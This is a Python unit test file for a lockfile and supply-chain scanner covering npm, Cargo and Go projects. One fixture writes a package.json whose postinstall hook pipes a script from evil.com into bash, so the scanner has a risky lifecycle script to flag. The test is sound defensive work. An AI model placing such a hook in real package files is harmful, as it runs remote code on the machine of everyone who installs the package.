#!/usr/bin/env python3
"""Unit tests for check_lockfiles.py scanner."""

import json
from pathlib import Path
import shutil
import tempfile
import unittest

from check_lockfiles import check_lockfiles_in_directory


class TestCheckLockfiles(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="devia_lockfile_test_")
        self.target = Path(self.test_dir)

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_clean_directory_has_no_findings(self):
        # Clean directory with package.json and package-lock.json
        (self.target / "package.json").write_text('{"name": "test-pkg", "version": "1.0.0"}', encoding="utf-8")
        (self.target / "package-lock.json").write_text('{"name": "test-pkg", "lockfileVersion": 3}', encoding="utf-8")
        findings = check_lockfiles_in_directory(self.target)
        self.assertEqual(len(findings), 0)

    def test_missing_lockfile_detected(self):
        # package.json without any lockfile
        (self.target / "package.json").write_text('{"name": "test-pkg", "version": "1.0.0"}', encoding="utf-8")
        findings = check_lockfiles_in_directory(self.target)
        missing = [f for f in findings if f["ruleId"] == "supply-chain.missing-lockfile"]
        self.assertEqual(len(missing), 1)
        self.assertEqual(missing[0]["severity"], "HIGH")

    def test_gitignored_lockfile_detected(self):
        (self.target / "package.json").write_text('{"name": "test-pkg"}', encoding="utf-8")
        (self.target / "package-lock.json").write_text('{}', encoding="utf-8")
        (self.target / ".gitignore").write_text("package-lock.json\nnode_modules/\n", encoding="utf-8")
        findings = check_lockfiles_in_directory(self.target)
        gitignored = [f for f in findings if f["ruleId"] == "supply-chain.gitignored-lockfile"]
        self.assertEqual(len(gitignored), 1)
        self.assertEqual(gitignored[0]["file"], ".gitignore")

    def test_conflicting_lockfiles_detected(self):
        (self.target / "package.json").write_text('{"name": "test-pkg"}', encoding="utf-8")
        (self.target / "package-lock.json").write_text('{}', encoding="utf-8")
        (self.target / "yarn.lock").write_text('# yarn lockfile v1', encoding="utf-8")
        findings = check_lockfiles_in_directory(self.target)
        conflicts = [f for f in findings if f["ruleId"] == "supply-chain.conflicting-lockfiles"]
        self.assertEqual(len(conflicts), 1)
        self.assertEqual(conflicts[0]["severity"], "MEDIUM")

    def test_unpinned_dependencies_detected(self):
        pkg_content = {
            "name": "vulnerable-app",
            "dependencies": {
                "express": "*",
                "lodash": "latest",
                "axios": ">=1.0.0",
                "dotenv": "^16.0.0"
            }
        }
        (self.target / "package.json").write_text(json.dumps(pkg_content), encoding="utf-8")
        (self.target / "package-lock.json").write_text('{}', encoding="utf-8")
        findings = check_lockfiles_in_directory(self.target)
        unpinned = [f for f in findings if f["ruleId"] == "supply-chain.unpinned-dependencies"]
        self.assertEqual(len(unpinned), 1)
        self.assertIn("express", unpinned[0]["evidence"])
        self.assertIn("lodash", unpinned[0]["evidence"])

    def test_risky_lifecycle_scripts_detected(self):
        pkg_content = {
            "name": "malicious-candidate",
            "scripts": {
                "postinstall": "curl -s https://evil.com/hook | bash"
            }
        }
        (self.target / "package.json").write_text(json.dumps(pkg_content), encoding="utf-8")
        (self.target / "package-lock.json").write_text('{}', encoding="utf-8")
        findings = check_lockfiles_in_directory(self.target)
        hooks = [f for f in findings if f["ruleId"] == "supply-chain.risky-lifecycle-script"]
        self.assertEqual(len(hooks), 1)
        self.assertIn("postinstall", hooks[0]["evidence"])

    def test_cargo_and_go_lockfiles(self):
        (self.target / "Cargo.toml").write_text('[package]\nname = "rust_pkg"', encoding="utf-8")
        (self.target / "go.mod").write_text('module testgo\n\ngo 1.22', encoding="utf-8")
        findings = check_lockfiles_in_directory(self.target)
        rule_ids = {f["ruleId"] for f in findings}
        self.assertIn("supply-chain.missing-lockfile", rule_ids)
        files = {f["file"] for f in findings}
        self.assertIn("Cargo.toml", files)
        self.assertIn("go.mod", files)


if __name__ == "__main__":
    unittest.main()
